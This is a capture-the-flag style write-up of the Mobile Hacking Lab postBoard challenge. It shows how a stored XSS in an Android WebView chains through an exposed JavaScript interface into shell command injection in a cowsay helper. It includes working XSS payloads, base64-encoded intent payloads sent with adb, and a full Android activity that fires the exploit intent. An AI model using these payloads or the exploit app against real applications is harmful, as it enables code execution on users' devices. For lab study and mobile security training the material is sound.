**Description**: Welcome to the **Android Insecure WebView Challenge**! This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.

**Download**: https://lautarovculic.com/my_files/postBoard.apk
**Link**:https://www.mobilehackinglab.com/path-player?courseid=lab-webview

![[postBoard.png]]

Install the app with **ADB**
```bash
adb install -r postBoard.apk
```

So, a simple test with `<img src=asd onerror=alert('xss');>` it's work.
We can craft a **storaged XSS** in the app.
The way of find a **RCE**, is looking the **source code**.

Let's inspect the **source code** with **jadx**
We have the **MainActivity** exported that **handle an Intent**
```XML
<activity
    android:name="com.mobilehackinglab.postboard.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="postboard"
            android:host="postmessage"/>
    </intent-filter>
</activity>
```

We can *post a message* with the following **ADB** command:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "postboard://postmessage/<base64-Payload>" \
com.mobilehackinglab.postboard
```
But
**Why base64?**
We can see in the `handleIntent()` method
```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (!Intrinsics.areEqual("android.intent.action.VIEW", action) || data == null || !Intrinsics.areEqual(data.getScheme(), "postboard") || !Intrinsics.areEqual(data.getHost(), "postmessage")) {
        return;
    }
    ActivityMainBinding activityMainBinding = null;
    try {
        String path = data.getPath();
        byte[] decode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8);
        Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
        String message = StringsKt.replace$default(new String(decode, Charsets.UTF_8), "'", "\\'", false, 4, (Object) null);
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding2 = null;
        }
        activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
    } catch (Exception e) {
        ActivityMainBinding activityMainBinding3 = this.binding;
        if (activityMainBinding3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding3;
        }
        activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
    }
}
```
That there are a **base64** decode in the message.

But if we send a **malformed base64**, we can see a *cow* that say
![[postBoard2.png]]

Notice that **JavaScript** is enabled in the `setupWebView()` method
```java
webView.getSettings().setJavaScriptEnabled(true);
```

Inside of the app, we can see in the **resources directory**, that there are **two files**.
`cowsay.sh` and `index.html`.
The `index.html` file is the content of the **WebView**. And the `cowsay.sh` is the *error handler* when we send a *bad base-64*.

But, **why an `.sh` file?** well, if we pay attention in the **MainActivity.java** class, we can found another class: **`CowsayUtil`**
That have the following interesting code:
```java
public final String runCowsay(String message) {
    Intrinsics.checkNotNullParameter(message, "message");
    try {
        String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
        Process process = Runtime.getRuntime().exec(command);
        StringBuilder output = new StringBuilder();
        InputStream inputStream = process.getInputStream();
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        try {
            BufferedReader reader = bufferedReader;
            while (true) {
                String it = reader.readLine();
                if (it == null) {
                    Unit unit = Unit.INSTANCE;
                    Closeable.closeFinally(bufferedReader, null);
                    process.waitFor();
                    String sb = output.toString();
                    Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");
                    return sb;
                }
                output.append(it).append("\n");
            }
        } finally {
        }
    } catch (Exception e) {
        e.printStackTrace();
        return "cowsay: " + e.getMessage();
    }
}
```
Notice this command execution
```java
String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
Process process = Runtime.getRuntime().exec(command);
```

Also, in **MainActivity** let's look how the **WebView** work.
```java
private final void setupWebView(WebView webView) {
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebAppChromeClient());
    webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
    webView.loadUrl("file:///android_asset/index.html");
}
```
We can see that the interface is called **WebAppInterface**. And is used in this piece of code:
```java
activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
```

We can make an **methods enumeration** with this payload:
```html
<img src=asd onerror=alert(Object.keys(WebAppInterface))>
```
Output:
```bash
clearCache, getMessages, postCowsayMessage, postMarkdownMessage
```
I think that the `postCowsayMessage` is that we need to achieve RCE.

That is used under
```java
activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
```
The `getMessage()` is `bad base-64` text.
We can try change this with
```html
<img src=asd onerror=WebAppInterface.postCowsayMessage('"hola"')>
```
Then, send an intent with a malformed base64
```bash
adb shell am start -a android.intent.action.VIEW \
-d "postboard://postmessage/lautarovculicCg==" \
com.mobilehackinglab.postboard
```

![[postBoard3.png]]

We can see that the **text has been changed**.
So, we can use `;` to execute a command?
```html
<img src="asd" onerror="WebAppInterface.postCowsayMessage('hola;id')"> 
```
Send it via **ADB**
```bash
adb shell am start -a android.intent.action.VIEW \
-d postboard://postmessage/PGltZyBzcmM9ImFzZCIgb25lcnJvcj0iV2ViQXBwSW50ZXJmYWNlLnBvc3RDb3dzYXlNZXNzYWdlKCdob2xhO2lkJykiPiA= \
-n com.mobilehackinglab.postboard/.MainActivity
```
Then, send an malformed base-64
```bash
adb shell am start -a android.intent.action.VIEW \
-d "postboard://postmessage/lautarovculicCg==" \
com.mobilehackinglab.postboard
```

![[postBoard4.png]]
And we got **RCE**!

You can **craft an app** with this **`MainActivity.java`** class
```java
package com.lautaro.executeboard;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button sendIntentButton = findViewById(R.id.sendIntentButton);
        sendIntentButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Craft Intent
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("postboard://postmessage/PGltZyBzcmM9ImFzZCIgb25lcnJvcj0iV2ViQXBwSW50ZXJmYWNlLnBvc3RDb3dzYXlNZXNzYWdlKCdob2xhO2lkJykiPiA="));
                intent.setClassName("com.mobilehackinglab.postboard", "com.mobilehackinglab.postboard.MainActivity");
                
                // Send Intent
                startActivity(intent);
            }
        });
    }
}
```
And **`activity_main.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:padding="16dp">

    <Button
        android:id="@+id/sendIntentButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Send Intent" 
        android:layout_centerInParent="true"/>
</RelativeLayout>
```



I hope you found it useful (: